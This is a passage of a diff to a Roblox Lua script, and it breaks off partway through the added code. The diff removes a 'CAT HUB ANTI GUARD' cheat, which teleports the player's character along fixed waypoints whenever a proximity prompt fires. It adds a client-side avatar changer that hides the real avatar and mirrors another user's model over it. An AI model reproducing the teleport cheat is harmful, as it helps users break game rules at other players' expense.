@@ -1,481 +1,1176 @@
--- ============================================================
--- CAT HUB ANTI GUARD
--- Made by Chris
--- ============================================================
-local proximityPromptService = game:GetService("ProximityPromptService")
-local runService = game:GetService("RunService")
-local tweenService = game:GetService("TweenService")
-local userInputService = game:GetService("UserInputService")
-local players = game:GetService("Players")
+--========================================================
+-- CHRIS AVATAR CHANGER
+-- Full Standalone Version
+-- Visual avatar follows movement + animation
+--========================================================
 
--- 🔵 BLUE THEME
-local color = Color3.fromRGB(35, 125, 255)
-local color2 = Color3.fromRGB(100, 180, 255)
-local color3 = Color3.fromRGB(255, 255, 255)
-local color4 = Color3.fromRGB(8, 12, 22)
-local color5 = Color3.fromRGB(0, 220, 100)
-local color6 = Color3.fromRGB(255, 60, 60)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
-local localPlayer = players.LocalPlayer
-local playerGui = localPlayer:WaitForChild("PlayerGui")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Waypoints
-local v1 = {
-    Vector3.new(500.62, 70.28, -366.64), Vector3.new(508.3, 70.28, -366.03),
-    Vector3.new(519.43, 70.28, -366.47), Vector3.new(529.22, 70.28, -366.71),
-    Vector3.new(546.8, 70.28, -364.4),
+local IMAGE_ID =
+    "rbxthumb://type=Asset&id=85422381974829&w=420&h=420"
+
+--========================================================
+-- STATE
+--========================================================
+
+local Overlay = {
+    model = nil,
+    hrp = nil,
+    weld = nil,
+    renderConn = nil,
+    motorPairs = {},
+    hiddenParts = {},
+    lastUserId = nil,
+    lastUsername = nil
 }
 
--- ✅ ANTI-GUARD ON BY DEFAULT
-local v2 = true
-local isOnCooldown = false
+local Busy = false
 
--- Destroy old GUI
-local oldGui = playerGui:FindFirstChild("CAT_HUB_ANTI_GUARD")
-if oldGui then oldGui:Destroy() end
+--========================================================
+-- REMOVE OLD GUI
+--========================================================
 
--- ============================================================
--- SCREENGUI
--- ============================================================
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CAT_HUB_ANTI_GUARD"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.Parent = playerGui
+local oldGui =
+    PlayerGui:FindFirstChild("ChrisAvatarChanger")
 
--- ============================================================
--- FLOATING CIRCLE BUTTON (DRAGGABLE)
--- ============================================================
-local floatBtn = Instance.new("ImageButton")
-floatBtn.Name = "CAT_FLOAT"
-floatBtn.Size = UDim2.fromOffset(54, 54)
-floatBtn.Position = UDim2.new(1, -68, 0, 16)
-floatBtn.BackgroundColor3 = color4
-floatBtn.BackgroundTransparency = 0.3
-floatBtn.BorderSizePixel = 0
-floatBtn.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=85422381974829&width=420&height=420&format=png"
-floatBtn.ImageColor3 = color3
-floatBtn.Active = true
-floatBtn.ZIndex = 200
-floatBtn.Parent = screenGui
-
-local uiCorner = Instance.new("UICorner")
-uiCorner.CornerRadius = UDim.new(1, 0)
-uiCorner.Parent = floatBtn
-
-local uiStroke = Instance.new("UIStroke")
-uiStroke.Thickness = 2
-uiStroke.Color = color
-uiStroke.Parent = floatBtn
-
-task.spawn(function()
-    while floatBtn.Parent do
-        tweenService:Create(uiStroke, TweenInfo.new(0.45), { Transparency = 0.6, Color = color2 }):Play()
-        task.wait(0.45)
-        tweenService:Create(uiStroke, TweenInfo.new(0.9), { Transparency = 0, Color = color }):Play()
-        task.wait(0.9)
-    end
-end)
-
--- ============================================================
--- CIRCLE DRAG (tap = show panel, drag = move circle)
--- ============================================================
-local circleDrag = false
-local circleMoved = false
-local circleStart, circleStartPos
-
-floatBtn.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch
-    or input.UserInputType == Enum.UserInputType.MouseButton1 then
-        circleDrag = true
-        circleMoved = false
-        circleStart = input.Position
-        circleStartPos = floatBtn.Position
-    end
-end)
-
-userInputService.InputChanged:Connect(function(input)
-    if circleDrag and (input.UserInputType == Enum.UserInputType.Touch
-    or input.UserInputType == Enum.UserInputType.MouseMovement) then
-        local delta = input.Position - circleStart
-        if math.abs(delta.X) > 5 or math.abs(delta.Y) > 5 then
-            circleMoved = true
-        end
-        floatBtn.Position = UDim2.new(
-            circleStartPos.X.Scale, circleStartPos.X.Offset + delta.X,
-            circleStartPos.Y.Scale, circleStartPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
-userInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch
-    or input.UserInputType == Enum.UserInputType.MouseButton1 then
-        if circleDrag and not circleMoved then
-            -- Tap lang → show/hide panel
-            if panel then
-                panel.Visible = not panel.Visible
-            end
-        end
-        circleDrag = false
-        circleMoved = false
-    end
-end)
-
--- ============================================================
--- MAIN PANEL (HIDDEN INITIALLY)
--- ============================================================
-local panel = Instance.new("Frame")
-panel.Name = "CAT_PANEL"
-panel.Size = UDim2.fromOffset(265, 190)
-panel.Position = UDim2.new(1, -275, 0, 76)
-panel.BackgroundColor3 = color4
-panel.BackgroundTransparency = 0.15
-panel.BorderSizePixel = 0
-panel.ClipsDescendants = true
-panel.ZIndex = 14
-panel.Visible = false  -- ✅ HIDDEN MUNA
-panel.Parent = screenGui
-
-local uiCorner2 = Instance.new("UICorner")
-uiCorner2.CornerRadius = UDim.new(0, 18)
-uiCorner2.Parent = panel
-
-local uiStroke2 = Instance.new("UIStroke")
-uiStroke2.Thickness = 2
-uiStroke2.Color = color
-uiStroke2.Parent = panel
-
-task.spawn(function()
-    while panel.Parent do
-        tweenService:Create(uiStroke2, TweenInfo.new(0.43), { Transparency = 0.6, Color = color2 }):Play()
-        task.wait(0.43)
-        tweenService:Create(uiStroke2, TweenInfo.new(1), { Transparency = 0, Color = color }):Play()
-        task.wait(1)
-    end
-end)
-
--- Top bar
-local topBar = Instance.new("Frame")
-topBar.Size = UDim2.new(1, 0, 0, 4)
-topBar.BackgroundColor3 = color2
-topBar.BorderSizePixel = 0
-topBar.ZIndex = 20
-topBar.Parent = panel
-
-local uiCorner3 = Instance.new("UICorner")
-uiCorner3.CornerRadius = UDim.new(0, 18)
-uiCorner3.Parent = topBar
-
-local uiGradient = Instance.new("UIGradient")
-uiGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 40, 120)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 180, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 40, 120)),
-})
-uiGradient.Parent = topBar
-
-task.spawn(function()
-    while topBar.Parent do
-        tweenService:Create(uiGradient, TweenInfo.new(
-            2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true
-        ), { Offset = Vector2.new(0.6, 0) }):Play()
-        task.wait(2.5)
-    end
-end)
-
--- Particles
-for i = 1, 15 do
-    local particle = Instance.new("Frame")
-    local size = math.random(2, 4)
-    particle.Size = UDim2.fromOffset(size, size)
-    particle.Position = UDim2.new(math.random(5, 95) / 100, 0, math.random(5, 95) / 100, 0)
-    particle.BackgroundColor3 = color2
-    particle.BackgroundTransparency = math.random(30, 75) / 100
-    particle.BorderSizePixel = 0
-    particle.ZIndex = 16
-    particle.Parent = panel
-    
-    local uiCorner4 = Instance.new("UICorner")
-    uiCorner4.CornerRadius = UDim.new(1, 0)
-    uiCorner4.Parent = particle
+if oldGui then
+    oldGui:Destroy()
 end
 
--- Title
-local titleLabel = Instance.new("TextLabel")
-titleLabel.BackgroundTransparency = 1
-titleLabel.Position = UDim2.fromOffset(14, 10)
-titleLabel.Size = UDim2.new(1, -28, 0, 26)
-titleLabel.Text = "🐱 CAT HUB"
-titleLabel.TextColor3 = color2
-titleLabel.Font = Enum.Font.GothamBlack
-titleLabel.TextSize = 17
-titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-titleLabel.ZIndex = 50
-titleLabel.Parent = panel
+--========================================================
+-- GUI
+--========================================================
 
-task.spawn(function()
-    local tweenInfo = TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
-    while titleLabel.Parent do
-        tweenService:Create(titleLabel, tweenInfo, { TextColor3 = color3 }):Play()
-        task.wait(0.9)
-        tweenService:Create(titleLabel, tweenInfo, { TextColor3 = color2 }):Play()
-        task.wait(0.9)
-    end
-end)
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "ChrisAvatarChanger"
+Gui.ResetOnSpawn = false
+Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Gui.Parent = PlayerGui
 
--- Subtitle
-local subtitleLabel = Instance.new("TextLabel")
-subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Position = UDim2.fromOffset(14, 34)
-subtitleLabel.Size = UDim2.new(1, -28, 0, 16)
-subtitleLabel.Text = "[ ANTI GUARD ]"
-subtitleLabel.TextColor3 = Color3.fromRGB(100, 160, 255)
-subtitleLabel.Font = Enum.Font.Code
-subtitleLabel.TextSize = 8
-subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-subtitleLabel.ZIndex = 50
-subtitleLabel.Parent = panel
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.fromOffset(320, 180)
+Main.Position = UDim2.new(0.5, -160, 0.5, -90)
+Main.BackgroundColor3 = Color3.fromRGB(25, 105, 180)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Parent = Gui
 
--- Made by Chris
-local madeByLabel = Instance.new("TextLabel")
-madeByLabel.BackgroundTransparency = 1
-madeByLabel.Position = UDim2.fromOffset(14, 50)
-madeByLabel.Size = UDim2.new(1, -28, 0, 12)
-madeByLabel.Text = "Made by Chris"
-madeByLabel.TextColor3 = Color3.fromRGB(150, 180, 220)
-madeByLabel.Font = Enum.Font.Gotham
-madeByLabel.TextSize = 8
-madeByLabel.TextXAlignment = Enum.TextXAlignment.Left
-madeByLabel.ZIndex = 50
-madeByLabel.Parent = panel
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = Main
 
--- Divider
-local divider = Instance.new("Frame")
-divider.Position = UDim2.fromOffset(10, 68)
-divider.Size = UDim2.new(1, -20, 0, 1)
-divider.BackgroundColor3 = color
-divider.BackgroundTransparency = 0.3
-divider.BorderSizePixel = 0
-divider.ZIndex = 50
-divider.Parent = panel
+--========================================================
+-- TITLE
+--========================================================
 
--- Status Label
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Position = UDim2.fromOffset(10, 78)
-statusLabel.Size = UDim2.new(1, -20, 0, 24)
-statusLabel.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
-statusLabel.BorderSizePixel = 0
-statusLabel.Text = "   ●  SYSTEM READY"
-statusLabel.TextColor3 = color5
-statusLabel.Font = Enum.Font.GothamBold
-statusLabel.TextSize = 11
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.ZIndex = 50
-statusLabel.Parent = panel
+local Title = Instance.new("TextLabel")
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.fromOffset(15, 7)
+Title.Size = UDim2.new(1, -105, 0, 25)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "AVATAR CHANGER"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextSize = 17
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Main
 
-local uiCorner5 = Instance.new("UICorner")
-uiCorner5.CornerRadius = UDim.new(0, 8)
-uiCorner5.Parent = statusLabel
+--========================================================
+-- MINIMIZE
+--========================================================
 
--- Anti Guard Button
-local antiGuardBtn = Instance.new("TextButton")
-antiGuardBtn.Position = UDim2.fromOffset(10, 112)
-antiGuardBtn.Size = UDim2.new(1, -20, 0, 45)
-antiGuardBtn.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
-antiGuardBtn.BorderSizePixel = 0
-antiGuardBtn.RichText = true
-antiGuardBtn.Text = '<font color="rgb(255,255,255)">[+] ANTI GUARD • </font><font color="rgb(0,220,100)">ON</font>'
-antiGuardBtn.TextColor3 = color3
-antiGuardBtn.Font = Enum.Font.GothamBlack
-antiGuardBtn.TextSize = 13
-antiGuardBtn.AutoButtonColor = false
-antiGuardBtn.ZIndex = 60
-antiGuardBtn.Parent = panel
+local Minimize = Instance.new("TextButton")
+Minimize.Size = UDim2.fromOffset(27, 27)
+Minimize.Position = UDim2.new(1, -58, 0, 4)
+Minimize.BackgroundColor3 = Color3.fromRGB(45, 125, 205)
+Minimize.BorderSizePixel = 0
+Minimize.Font = Enum.Font.GothamBold
+Minimize.Text = "−"
+Minimize.TextColor3 = Color3.new(1, 1, 1)
+Minimize.TextSize = 18
+Minimize.Parent = Main
 
-local uiCorner6 = Instance.new("UICorner")
-uiCorner6.CornerRadius = UDim.new(0, 12)
-uiCorner6.Parent = antiGuardBtn
+local MinCorner = Instance.new("UICorner")
+MinCorner.CornerRadius = UDim.new(0, 7)
+MinCorner.Parent = Minimize
 
-local uiStroke3 = Instance.new("UIStroke")
-uiStroke3.Thickness = 2
-uiStroke3.Color = color
-uiStroke3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-uiStroke3.Parent = antiGuardBtn
+--========================================================
+-- CLOSE
+--========================================================
 
-antiGuardBtn.MouseButton1Click:Connect(function()
-    v2 = not v2
-    if v2 then
-        antiGuardBtn.Text = '<font color="rgb(255,255,255)">[+] ANTI GUARD • </font><font color="rgb(0,220,100)">ON</font>'
-        statusLabel.Text = "   ●  SYSTEM READY"
-        statusLabel.TextColor3 = color5
-        uiStroke3.Color = color
-    else
-        antiGuardBtn.Text = '<font color="rgb(255,255,255)">[-] ANTI GUARD • </font><font color="rgb(255,60,60)">OFF</font>'
-        statusLabel.Text = "   ○  SYSTEM DISABLED"
-        statusLabel.TextColor3 = color6
-        uiStroke3.Color = color6
-    end
-end)
+local Close = Instance.new("TextButton")
+Close.Size = UDim2.fromOffset(27, 27)
+Close.Position = UDim2.new(1, -31, 0, 4)
+Close.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
+Close.BorderSizePixel = 0
+Close.Font = Enum.Font.GothamBold
+Close.Text = "X"
+Close.TextColor3 = Color3.new(1, 1, 1)
+Close.TextSize = 14
+Close.Parent = Main
 
--- ============================================================
--- DRAG PANEL (via title)
--- ============================================================
-local isDragging = false
-local dragStart, panelStart
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 7)
+CloseCorner.Parent = Close
 
-titleLabel.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-    or input.UserInputType == Enum.UserInputType.Touch then
-        isDragging = true
-        dragStart = input.Position
-        panelStart = panel.Position
-    end
-end)
+--========================================================
+-- CREDIT
+--========================================================
 
-userInputService.InputChanged:Connect(function(input)
-    if not isDragging then return end
-    if input.UserInputType == Enum.UserInputType.MouseMovement
-    or input.UserInputType == Enum.UserInputType.Touch then
-        local delta = input.Position - dragStart
-        panel.Position = UDim2.new(
-            panelStart.X.Scale, panelStart.X.Offset + delta.X,
-            panelStart.Y.Scale, panelStart.Y.Offset + delta.Y
-        )
-    end
-end)
+local Credit = Instance.new("TextLabel")
+Credit.BackgroundTransparency = 1
+Credit.Position = UDim2.fromOffset(15, 34)
+Credit.Size = UDim2.new(1, -30, 0, 20)
+Credit.Font = Enum.Font.Gotham
+Credit.Text = "Made by Chris"
+Credit.TextColor3 = Color3.fromRGB(220, 235, 255)
+Credit.TextSize = 12
+Credit.TextXAlignment = Enum.TextXAlignment.Left
+Credit.Parent = Main
 
-userInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-    or input.UserInputType == Enum.UserInputType.Touch then
-        isDragging = false
-    end
-end)
+--========================================================
+-- USERNAME BOX
+--========================================================
 
--- ============================================================
--- LOADING SCREEN (FULLSCREEN BLACK 5s)
--- ============================================================
-local function showLoadingScreen()
-    local loadGui = Instance.new("ScreenGui")
-    loadGui.Name = "CAT_LOADING"
-    loadGui.ResetOnSpawn = false
-    loadGui.IgnoreGuiInset = true
-    loadGui.DisplayOrder = 999999
-    loadGui.Parent = playerGui
+local UsernameBox = Instance.new("TextBox")
+UsernameBox.Name = "UsernameBox"
+UsernameBox.Position = UDim2.fromOffset(15, 63)
+UsernameBox.Size = UDim2.new(1, -30, 0, 38)
+UsernameBox.BackgroundColor3 = Color3.fromRGB(15, 70, 130)
+UsernameBox.BorderSizePixel = 0
+UsernameBox.ClearTextOnFocus = false
+UsernameBox.Font = Enum.Font.Gotham
+UsernameBox.PlaceholderText = "Enter Roblox username..."
+UsernameBox.PlaceholderColor3 = Color3.fromRGB(180, 205, 230)
+UsernameBox.Text = ""
+UsernameBox.TextColor3 = Color3.new(1, 1, 1)
+UsernameBox.TextSize = 14
+UsernameBox.Parent = Main
 
-    local blackScreen = Instance.new("Frame")
-    blackScreen.Size = UDim2.fromScale(1, 1)
-    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    blackScreen.BorderSizePixel = 0
-    blackScreen.ZIndex = 1
-    blackScreen.Parent = loadGui
+local BoxCorner = Instance.new("UICorner")
+BoxCorner.CornerRadius = UDim.new(0, 8)
+BoxCorner.Parent = UsernameBox
 
-    local loadImage = Instance.new("ImageLabel")
-    loadImage.Size = UDim2.fromOffset(90, 90)
-    loadImage.Position = UDim2.new(0.5, -45, 0.5, -70)
-    loadImage.BackgroundTransparency = 1
-    loadImage.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=85422381974829&width=420&height=420&format=png"
-    loadImage.ZIndex = 2
-    loadImage.Parent = blackScreen
+--========================================================
+-- CHANGE BUTTON
+--========================================================
 
-    local loadText = Instance.new("TextLabel")
-    loadText.Size = UDim2.new(1, 0, 0, 30)
-    loadText.Position = UDim2.new(0, 0, 0.5, 30)
-    loadText.BackgroundTransparency = 1
-    loadText.Text = "Loading..."
-    loadText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loadText.Font = Enum.Font.GothamBold
-    loadText.TextSize = 18
-    loadText.ZIndex = 2
-    loadText.Parent = blackScreen
+local ChangeButton = Instance.new("TextButton")
+ChangeButton.Name = "ChangeAvatar"
+ChangeButton.Position = UDim2.fromOffset(15, 112)
+ChangeButton.Size = UDim2.new(0.5, -20, 0, 38)
+ChangeButton.BackgroundColor3 = Color3.fromRGB(35, 145, 220)
+ChangeButton.BorderSizePixel = 0
+ChangeButton.Font = Enum.Font.GothamBold
+ChangeButton.Text = "CHANGE AVATAR"
+ChangeButton.TextColor3 = Color3.new(1, 1, 1)
+ChangeButton.TextSize = 12
+ChangeButton.Parent = Main
 
-    local dots = 0
-    local dotLoop = task.spawn(function()
-        while loadText.Parent do
-            dots = (dots + 1) % 4
-            loadText.Text = "Loading" .. string.rep(".", dots)
-            task.wait(0.5)
+local ChangeCorner = Instance.new("UICorner")
+ChangeCorner.CornerRadius = UDim.new(0, 8)
+ChangeCorner.Parent = ChangeButton
+
+--========================================================
+-- REMOVE BUTTON
+--========================================================
+
+local RemoveButton = Instance.new("TextButton")
+RemoveButton.Name = "RemoveAvatar"
+RemoveButton.Position = UDim2.new(0.5, 5, 0, 112)
+RemoveButton.Size = UDim2.new(0.5, -20, 0, 38)
+RemoveButton.BackgroundColor3 = Color3.fromRGB(175, 65, 65)
+RemoveButton.BorderSizePixel = 0
+RemoveButton.Font = Enum.Font.GothamBold
+RemoveButton.Text = "REMOVE"
+RemoveButton.TextColor3 = Color3.new(1, 1, 1)
+RemoveButton.TextSize = 12
+RemoveButton.Parent = Main
+
+local RemoveCorner = Instance.new("UICorner")
+RemoveCorner.CornerRadius = UDim.new(0, 8)
+RemoveCorner.Parent = RemoveButton
+
+--========================================================
+-- MINI BUTTON
+--========================================================
+
+local Mini = Instance.new("ImageButton")
+Mini.Name = "Mini"
+Mini.Size = UDim2.fromOffset(58, 58)
+Mini.Position = UDim2.new(0.5, -29, 0, 20)
+Mini.BackgroundColor3 = Color3.fromRGB(25, 105, 180)
+Mini.BorderSizePixel = 0
+Mini.Image = IMAGE_ID
+Mini.Visible = false
+Mini.Parent = Gui
+
+local MiniCorner = Instance.new("UICorner")
+MiniCorner.CornerRadius = UDim.new(1, 0)
+MiniCorner.Parent = Mini
+
+local MiniStroke = Instance.new("UIStroke")
+MiniStroke.Thickness = 2
+MiniStroke.Color = Color3.new(1, 1, 1)
+MiniStroke.Parent = Mini
+
+--========================================================
+-- DRAGGING
+--========================================================
+
+local function makeDraggable(object)
+
+    local dragging = false
+    local dragStart
+    local startPosition
+    local moved = false
+
+    object.InputBegan:Connect(function(input)
+
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+
+            dragging = true
+            moved = false
+            dragStart = input.Position
+            startPosition = object.Position
+
+            input.Changed:Connect(function()
+
+                if input.UserInputState ==
+                    Enum.UserInputState.End then
+
+                    dragging = false
+                end
+            end)
         end
     end)
 
-    task.wait(5)
+    UserInputService.InputChanged:Connect(function(input)
 
-    task.cancel(dotLoop)
-    loadGui:Destroy()
-end
-
--- ============================================================
--- TELEPORT + COOLDOWN
--- ============================================================
-local function executeTeleport()
-    if not v2 then return end
-    if isOnCooldown then return end
-    
-    isOnCooldown = true
-    showLoadingScreen()
-    
-    local character = localPlayer.Character
-    if not character then
-        isOnCooldown = false
-        return
-    end
-    
-    -- Execute TP
-    for index, value in ipairs(v1) do
-        if not v2 then
-            statusLabel.Text = "   ○  ROUTE STOPPED"
-            statusLabel.TextColor3 = color6
-            isOnCooldown = false
+        if not dragging then
             return
         end
-        statusLabel.Text = "   [TP] POINT " .. index .. "/" .. #v1
-        statusLabel.TextColor3 = color3
-        character:PivotTo(CFrame.new(value))
-        if index < #v1 then
-            runService.Heartbeat:Wait()
+
+        if input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
+
+            local delta =
+                input.Position - dragStart
+
+            if math.abs(delta.X) > 4
+                or math.abs(delta.Y) > 4 then
+
+                moved = true
+            end
+
+            object.Position = UDim2.new(
+                startPosition.X.Scale,
+                startPosition.X.Offset + delta.X,
+
+                startPosition.Y.Scale,
+                startPosition.Y.Offset + delta.Y
+            )
         end
+    end)
+
+    return function()
+        return moved
     end
-    
-    statusLabel.Text = "   [OK] ROUTE COMPLETE"
-    statusLabel.TextColor3 = color5
-    
-    -- Cooldown 10s
-    local cooldown = 10
-    for i = cooldown, 1, -1 do
-        statusLabel.Text = "   ⏳ COOLDOWN: " .. i .. "s"
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
-        task.wait(1)
-    end
-    
-    isOnCooldown = false
-    statusLabel.Text = "   ●  SYSTEM READY"
-    statusLabel.TextColor3 = color5
 end
 
--- ============================================================
--- PROXIMITY PROMPT TRIGGER
--- ============================================================
-proximityPromptService.PromptTriggered:Connect(function(prompt, player)
-    if player ~= localPlayer then return end
-    if not v2 then return end
-    if isOnCooldown then
-        warn("[CAT HUB] Cooldown active")
+local MainWasDragged = makeDraggable(Main)
+local MiniWasDragged = makeDraggable(Mini)
+
+--========================================================
+-- CHARACTER
+--========================================================
+
+local function getCharacter()
+
+    return LocalPlayer.Character
+        or LocalPlayer.CharacterAdded:Wait()
+end
+
+local function getHRP(character)
+
+    return character
+        and character:FindFirstChild(
+            "HumanoidRootPart"
+        )
+end
+
+--========================================================
+-- OVERLAY FOLDER
+--========================================================
+
+local function getOverlayFolder()
+
+    local camera = workspace.CurrentCamera
+
+    if not camera then
+        return nil
+    end
+
+    local folder =
+        camera:FindFirstChild(
+            "_ChrisAvatarOverlay"
+        )
+
+    if not folder then
+
+        folder = Instance.new("Folder")
+        folder.Name = "_ChrisAvatarOverlay"
+        folder.Parent = camera
+    end
+
+    return folder
+end
+
+--========================================================
+-- STOP MIRROR
+--========================================================
+
+local function stopMirror()
+
+    if Overlay.renderConn then
+
+        Overlay.renderConn:Disconnect()
+        Overlay.renderConn = nil
+    end
+end
+
+--========================================================
+-- CLEAR MOTOR PAIRS
+--========================================================
+
+local function clearMotorPairs()
+
+    table.clear(
+        Overlay.motorPairs
+    )
+end
+
+--========================================================
+-- RESTORE REAL AVATAR
+--========================================================
+
+local function restoreRealAvatar()
+
+    for instance, oldTransparency
+        in pairs(Overlay.hiddenParts) do
+
+        if instance
+            and instance.Parent then
+
+            if instance:IsA("BasePart") then
+
+                instance.LocalTransparencyModifier =
+                    oldTransparency
+
+            elseif instance:IsA("Decal")
+                or instance:IsA("Texture") then
+
+                instance.Transparency =
+                    oldTransparency
+            end
+        end
+    end
+
+    table.clear(
+        Overlay.hiddenParts
+    )
+end
+
+--========================================================
+-- HIDE REAL AVATAR
+--========================================================
+
+local function hideRealAvatar(character)
+
+    if not character then
         return
     end
-    
-    warn("[CAT HUB] Proximity triggered — TP starting!")
-    task.spawn(executeTeleport)
-end)
 
--- ============================================================
--- STARTUP LOG
--- ============================================================
-print("================================")
-print("     CAT HUB • ANTI GUARD       ")
-print("     Made by Chris              ")
-print("================================")
-print(" ANTI GUARD: ON (default)")
-print(" WAYPOINTS: " .. #v1)
-print("==================================")
-warn("🐱 [CAT HUB] ANTI GUARD ACTIVE")
+    table.clear(
+        Overlay.hiddenParts
+    )
+
+    for _, instance in ipairs(
+        character:GetDescendants()
+    ) do
+
+        if instance:IsA("BasePart") then
+
+            Overlay.hiddenParts[instance] =
+                instance.LocalTransparencyModifier
+
+            instance.LocalTransparencyModifier = 1
+
+        elseif instance:IsA("Decal")
+            or instance:IsA("Texture") then
+
+            Overlay.hiddenParts[instance] =
+                instance.Transparency
+
+            instance.Transparency = 1
+        end
+    end
+end
+
+--========================================================
+-- PREPARE VISUAL AVATAR
+--========================================================
+
+local function prepareModel(model)
+
+    for _, instance in ipairs(
+        model:GetDescendants()
+    ) do
+
+        if instance:IsA("Script")
+            or instance:IsA("LocalScript")
+            or instance:IsA("ModuleScript") then
+
+            pcall(function()
+                instance:Destroy()
+            end)
+
+        elseif instance:IsA("BasePart") then
+
+            instance.CanCollide = false
+            instance.CanTouch = false
+            instance.CanQuery = false
+            instance.Massless = true
+        end
+    end
+
+    local humanoid =
+        model:FindFirstChildOfClass(
+            "Humanoid"
+        )
+
+    if humanoid then
+
+        humanoid.PlatformStand = true
+        humanoid.AutoRotate = false
+        humanoid.Sit = true
+
+        pcall(function()
+            humanoid:SetStateEnabled(
+                Enum.HumanoidStateType.Physics,
+                false
+            )
+        end)
+    end
+end
+
+--========================================================
+-- MOTOR KEY
+--========================================================
+
+local function motorKey(motor)
+
+    local part0 =
+        motor.Part0
+        and motor.Part0.Name
+        or ""
+
+    local part1 =
+        motor.Part1
+        and motor.Part1.Name
+        or ""
+
+    return motor.Name
+        .. "|"
+        .. part0
+        .. ">"
+        .. part1
+end
+
+--========================================================
+-- BUILD MOTOR PAIRS
+-- EXACT + FALLBACK MATCHING
+--========================================================
+
+local function buildMotorPairs(
+    sourceCharacter,
+    targetModel
+)
+
+    clearMotorPairs()
+
+    local sourceByKey = {}
+    local targetByKey = {}
+
+    local sourceByName = {}
+    local targetByName = {}
+
+    -- REAL CHARACTER
+    for _, instance in ipairs(
+        sourceCharacter:GetDescendants()
+    ) do
+
+        if instance:IsA("Motor6D") then
+
+            sourceByKey[
+                motorKey(instance)
+            ] = instance
+
+            if not sourceByName[instance.Name] then
+
+                sourceByName[instance.Name] =
+                    instance
+            end
+        end
+    end
+
+    -- VISUAL AVATAR
+    for _, instance in ipairs(
+        targetModel:GetDescendants()
+    ) do
+
+        if instance:IsA("Motor6D") then
+
+            targetByKey[
+                motorKey(instance)
+            ] = instance
+
+            if not targetByName[instance.Name] then
+
+                targetByName[instance.Name] =
+                    instance
+            end
+        end
+    end
+
+    local matched = {}
+
+    --====================================================
+    -- FIRST: EXACT MATCH
+    --====================================================
+
+    for key, sourceMotor
+        in pairs(sourceByKey) do
+
+        local targetMotor =
+            targetByKey[key]
+
+        if targetMotor then
+
+            table.insert(
+                Overlay.motorPairs,
+                {
+                    src = sourceMotor,
+                    tgt = targetMotor
+                }
+            )
+
+            matched[targetMotor] = true
+        end
+    end
+
+    --====================================================
+    -- SECOND: NAME MATCH FALLBACK
+    --====================================================
+
+    for name, sourceMotor
+        in pairs(sourceByName) do
+
+        local targetMotor =
+            targetByName[name]
+
+        if targetMotor
+            and not matched[targetMotor] then
+
+            table.insert(
+                Overlay.motorPairs,
+                {
+                    src = sourceMotor,
+                    tgt = targetMotor
+                }
+            )
+
+            matched[targetMotor] = true
+        end
+    end
+end
+
+--========================================================
+-- START MOVEMENT + ANIMATION MIRROR
+--========================================================
+
+local function startMirror()
+
+    stopMirror()
+
+    Overlay.renderConn =
+        RunService.RenderStepped:Connect(
+        function()
+
+            local visual =
+                Overlay.model
+
+            local visualHRP =
+                Overlay.hrp
+
+            if not visual
+                or not visualHRP
+                or not visual.Parent
+                or not visualHRP.Parent then
+
+                return
+            end
+
+            local realCharacter =
+                getCharacter()
+
+            local realHRP =
+                getHRP(realCharacter)
+
+            if not realHRP then
+                return
+            end
+
+            --================================================
+            -- ROOT MOVEMENT
+            --
+            -- The WeldConstraint normally keeps the visual
+            -- attached to the real character.
+            --
+            -- This fallback corrects the root if Roblox
+            -- separates the visual model.
+            --================================================
+
+            if (visualHRP.Position -
+                realHRP.Position).Magnitude > 0.05 then
+
+                visual:PivotTo(
+                    realHRP.CFrame
+                )
+            end
+
+            --================================================
+            -- ANIMATION / BODY POSE
+            --================================================
+
+            for _, pair in ipairs(
+                Overlay.motorPairs
+            ) do
+
+                local source =
+                    pair.src
+
+                local target =
+                    pair.tgt
+
+                if source
+                    and target
+                    and source.Parent
+                    and target.Parent then
